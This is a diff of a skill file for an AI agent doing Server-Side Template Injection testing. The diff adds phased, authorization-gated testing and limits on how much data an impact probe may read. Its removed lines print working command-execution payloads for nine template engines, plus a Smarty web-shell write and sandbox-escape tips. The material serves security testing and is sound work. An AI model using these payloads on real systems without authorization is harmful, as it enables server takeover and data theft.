@@ -1,22 +1,85 @@
 ---
 name: ssti
-description: Server-Side Template Injection — fingerprint the engine first (Jinja2 / Twig / Velocity / Freemarker / ERB / Smarty / Mako / Handlebars / Pug), then escalate the engine-specific primitive to RCE or sandbox escape. Use when user input is reflected through a template engine (Jinja2/Twig/Velocity/Freemarker/ERB/Smarty/Mako/Handlebars/Pug) or {{7*7}} evaluates to 49.
+description: >
+  Detect and validate suspected Server-Side Template Injection by
+  fingerprinting the template engine, confirming expression evaluation
+  beyond simple arithmetic, and — only with explicit user authorization
+  after SSTI is confirmed — validating impact through a minimal,
+  engine-specific execution or sensitive-read probe. Use after
+  web-input-analysis when user input appears to be reflected through a
+  template context, or when an expression like {{7*7}} evaluates to 49.
 allowed-tools:
   - http
   - shell
   - read_payloads
   - file_write
+  - ask_user
 ---
 
 # SSTI playbook
 
-You suspect user input is concatenated into a server-side template. The classic tell: `{{7*7}}` renders as `49` (not as the literal). But that's only the start — to file a real bug you must identify the engine, then prove RCE or read sensitive state.
+This skill covers three phases in one workflow: detection, validation,
+and optional impact. Phase 1 and Phase 2 run as part of normal SSTI
+testing. Phase 3 (impact) is optional and gated — it does not run
+automatically, even after SSTI is confirmed.
 
-Execution rule: send probes to the real reflected parameter or template sink before escalating. Never write literal placeholder values to files; if the sink is unknown, first discover it with `http`/curl.
+```
+Phase 1: Detection / Fingerprint   — automatic, safe, arithmetic-only
+        ↓
+Phase 2: Validation                 — confirms SSTI (SSTI-1 / SSTI-2)
+        ↓
+Phase 3: Impact validation (optional) — only with explicit ask_user
+                                          authorization, after SSTI-2
+```
 
-## 1. Fingerprint the engine — fast
+Execution rule: use the actual target URL, parameter, and injection
+context before running probes. Never write literal placeholder values to
+files.
 
-Use `read_payloads(skill="ssti", file="fingerprint-polyglot.txt")` for the canonical multi-engine probe:
+## Preconditions
+
+Do not begin SSTI testing until all of the following are known:
+1. Target URL
+2. The actual parameter / input field that is reflected
+3. HTTP method and where the value is supplied (query, body, header, etc.)
+4. The context in which the input appears to be rendered (page body,
+   email, PDF, log, server-to-server message, etc.) — this determines
+   whether confirmation can be observed directly or requires a blind
+   channel
+5. A user-authorized canary/callback, if blind SSTI confirmation is
+   required (i.e. rendered output is never returned to you directly)
+
+If #5 is missing and blind confirmation is necessary, ask_user once for a
+canary/callback they control. Do not invent or reuse a canary domain from
+memory or prior sessions.
+
+## Scope checkpoint (entering Phase 2)
+
+Before running any probe that goes beyond arithmetic expression
+evaluation — object introspection, filter/attribute chains, or anything
+that could read files, execute commands, or access environment state —
+confirm authorization with `ask_user` if it has not already been
+established for this engagement.
+
+Use `ask_user` when:
+
+- the fingerprint step (Phase 1) confirms the parameter is template-
+  evaluated, and further probing would move past arithmetic into
+  introspection,
+- the target is a shared/production-like environment and the impact of
+  further probing is unclear,
+- blind confirmation requires an external canary not yet authorized.
+
+Do not infer authorization merely because a fingerprint payload succeeded.
+
+## Phase 1: Detection / fingerprint
+
+This step is safe and non-destructive — it only evaluates arithmetic, so
+it can run without a scope-checkpoint confirmation.
+
+Use `read_payloads(skill="ssti", file="payloads.txt")` for the canonical
+multi-engine probe — use only the `PHASE 1 — FINGERPRINT` section at the
+top of that file:
 
 ```
 ${7*7}
@@ -37,127 +100,132 @@ Cross-reference results:
 | `49` from `*{7*7}` | **Smarty** |
 | Output of `{{7*7}}` literally | Not an SSTI primitive — look elsewhere |
 
-Distinguish Velocity from Freemarker: `${"foo".getClass()}` returns `class java.lang.String` for both; **Freemarker** chokes on `<#assign>` outside a template block; **Velocity** specifically renders `#set($x=7*7)$x` as `49`.
+Distinguish Velocity from Freemarker using arithmetic and parse behavior only: **Freemarker** chokes on `<#assign>` outside a template block; **Velocity** specifically renders `#set($x=7*7)$x` as `49`. Do not use introspection (e.g. `${"foo".getClass()}`) at this stage — that discriminator belongs to Phase 2, since it inspects an object rather than evaluating arithmetic.
 
-## 2. Engine-specific exploitation
+If no probe evaluates, do not conclude that SSTI is absent. Stop this
+testing path and report that SSTI could not be confirmed with the
+available evidence — the null result may be caused by output escaping, a
+non-template rendering path, or a blind context without a matching
+canary.
 
-### Jinja2 (Python, Flask)
+A successful Phase 1 probe establishes **SSTI-1** (signal: template
+expression evaluation observed and a likely engine identified) — it does
+not by itself establish a confirmed SSTI finding. Additional validation is required in Phase 2 before reporting SSTI-2.
 
-```
-{{ ''.__class__.__mro__[1].__subclasses__() }}
-```
+## Phase 2: Validation
 
-Find an index where the subclass is `<class 'subprocess.Popen'>` (commonly 200–400). Then:
+Once the engine is fingerprinted, run the scope checkpoint above before
+continuing. With authorization, use the minimal probe needed to confirm
+evaluation extends beyond arithmetic — not to reach execution.
 
-```
-{{ ''.__class__.__mro__[1].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}
-```
+Examples of minimal, non-destructive confirmation:
 
-Bypass blacklists with attribute proxies:
+- Object/class introspection that returns type information only (e.g.
+  `${"foo".getClass()}` on Velocity/Freemarker, which returns `class
+  java.lang.String` — useful both to confirm evaluation beyond
+  arithmetic and, combined with the Phase 1 parse-behavior result, to
+  disambiguate the two engines).
+- A benign built-in or filter that returns non-sensitive output.
+- An engine-specific expression that demonstrates server-side evaluation
+  beyond arithmetic without traversing toward an execution primitive.
 
-```
-{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
-```
+Do not attempt to enumerate or walk toward an exec-capable gadget (e.g.
+subclass enumeration searching for `subprocess.Popen`) as part of Phase
+2 — even without invoking it, that enumeration is already probing toward
+execution and belongs to Phase 3.
 
-Payloads: `read_payloads(skill="ssti", file="jinja2.txt")`.
+Do not run engine-specific remote-code-execution payloads (subprocess
+invocation, `Runtime.exec`, `system`, `popen`, `execSync`, PHP `exec`
+filters, or equivalent) as part of Phase 2. Those are Phase 3 only.
 
-### Twig (PHP, Symfony)
+For Jinja2 and Velocity/Freemarker, read_payloads(skill="ssti", file="payloads.txt") provides introspection-only probes for this
+phase — use only the `PHASE 2 — VALIDATION` section of that file.
+Everything in the `PHASE 3` section below it requires separate Phase 3
+authorization; reading further into the file for Phase 2 does not grant
+permission to use it.
 
-Twig blocks most function access. Two proven escapes:
+### Blind SSTI validation
 
-```
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-```
+If rendered output is never returned to you directly (email, server-to-
+server message, async job, log line), confirm using a side channel:
 
-```
-{{['id']|filter('system')}}
-```
+- a user-authorized DNS or HTTP callback, referenced from the
+  Preconditions step,
+- timing analysis only as a last resort, and only with a baseline
+  comparison to rule out unrelated latency.
 
-Older versions: `{{['id',1]|sort('passthru')}}`.
+Do not perform an OS command execution to trigger the callback. Prefer an
+engine built-in (e.g. a template function that performs an HTTP fetch or
+DNS resolution as part of normal rendering) where the engine supports
+one; if none is available without executing a command, treat this as
+SSTI-2 at most and stop — reaching SSTI-3 through a blind channel still
+requires Phase 3 authorization.
 
-### Velocity (Java, NVelocity)
+### Determine the result
 
-```
-#set($e="exp")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")
-```
+Classify the result as one of:
 
-### Freemarker (Java)
+- **SSTI-1** — template-expression evaluation observed and a likely
+  engine identified, but additional validation is required before
+  reporting a confirmed SSTI finding.
+- **SSTI-2** — SSTI conclusively confirmed through non-destructive
+  expression evaluation beyond simple arithmetic.
+- **SSTI-3** — impact such as command execution or sensitive data access
+  conclusively demonstrated through Phase 3. Only reachable via Phase 3.
 
-Built-in `?eval`, or the classic exec gadget:
+Do not report SSTI-3 without direct evidence of command output or
+sensitive file/data content obtained during Phase 3.
 
-```
-<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
-```
+If the available evidence is inconclusive, do not conclude that SSTI is
+absent. Report that SSTI could not be confirmed with the available
+evidence.
 
-### ERB (Ruby)
+**SSTI-2 is a complete, reportable finding on its own.** Do not treat it
+as unfinished work that needs Phase 3 to be "real" — stop here unless the
+conditions below are met.
 
-```
-<%= `id` %>
-<%= system("id") %>
-<%= IO.popen("id").read %>
-```
+## Phase 3: Impact validation (optional)
 
-### Smarty (PHP)
+Do not enter this phase automatically.
 
-```
-{php}echo `id`;{/php}    {# pre-3.1.30 #}
-{system('id')}           {# some forks #}
-```
+Only proceed when:
+1. SSTI has already been confirmed (SSTI-2), and
+2. the user explicitly authorizes deeper impact validation via ask_user.
 
-Newer Smarty: `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']);?>",self::clearConfig())}`.
+This phase may use engine-specific impact payloads from `payloads.txt`,
+including command-execution or a minimal sensitive-read probe. For
+Jinja2, `read_payloads(skill="ssti", file="payloads.txt")` provides
+these — use the `PHASE 3 — IMPACT` section of that file, which includes
+subclass-enumeration-to-`Popen` execution and the `__globals__`
+attribute-proxy route via `url_for`/`lipsum`/`cycler`/`request`.
 
-### Mako (Python)
+Only retrieve the minimum non-sensitive or minimally sensitive artifact
+needed to demonstrate impact (e.g. the output of a harmless command like
+`id`, or a single file explicitly relevant to the finding). Do not dump
+environment, configuration, or request context broadly — a broad dump
+(full config object, full environment, full request context) is not
+"minimal impact" even when it technically executes nothing, and it risks
+disclosing secrets (e.g. Flask `SECRET_KEY`) far beyond what's needed to
+establish the finding.
 
-```
-${self.module.cache.util.os.popen('id').read()}
-<% import os; x=os.popen('id').read() %>${x}
-```
-
-### Handlebars (Node)
-
-```
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.push "return require('child_process').execSync('id');"}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push (lookup conslist.0 "apply")}}
-        {{this.apply 0 codelist}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-```
-
-### Pug / Jade (Node)
-
-```
-#{ root.process.mainModule.require('child_process').execSync('id').toString() }
-```
-
-## 3. Sandbox escape thinking
-
-If `{{7*7}}` works but exec is blocked:
-- Try filter chains and pipes that hand off through string types (Twig).
-- Try indirect-attribute access (`['__class__']` instead of `.__class__`).
-- Try Unicode escapes on the dangerous keyword (`{{ ''.__class__ }}`).
-- Read the engine's source for the relevant version — most "sandboxes" have a documented escape.
-
-## 4. Blind SSTI
-
-If the rendered template never returns to you (sent in email, server-to-server message), confirm with side-channels:
-- DNS callback via OS exec.
-- HTTP callback to an out-of-band listener.
-- Timing: render an expensive loop and measure response delay.
+Stop once the minimum impact necessary to establish the finding is
+proven (SSTI-3). Do not continue into unrelated post-exploitation,
+credential harvesting, lateral movement, or additional engines' exec
+payloads "just in case." Do not chain a disclosed secret (e.g. a leaked
+`SECRET_KEY`) into further exploitation (e.g. forging a session) unless
+the user separately authorizes that as its own step.
 
 ## Reporting
 
-For each finding include:
-- The exact input field where the payload landed.
-- The fingerprint output (`{{7*7}}` → `49` etc) — proves it's SSTI not arithmetic on the client.
-- An exec PoC (`id` output preferred) **OR**, if RCE is gated, a clear sensitive-data read (env vars, config file).
-- Engine + version inferred and from where.
+Write a report to `findings/ssti-{sanitized-parameter-or-path}.md`. The filename must be derived from the actual target/parameter and sanitized for filesystem safety: lowercase, with non-alphanumeric characters replaced by `-` — never write a literal placeholder as the filename.
+
+Include:
+
+- the exact input field where the payload landed
+- the fingerprint output (`{{7*7}}` → `49` etc.) and inferred engine plus
+  version, with reasoning
+- the SSTI level reached (1–3) and the exact probe/response evidence for
+  it
+- a note when evidence is inconclusive
+- if Phase 3 was not run: a note that deeper impact validation is
+  available but requires explicit authorization
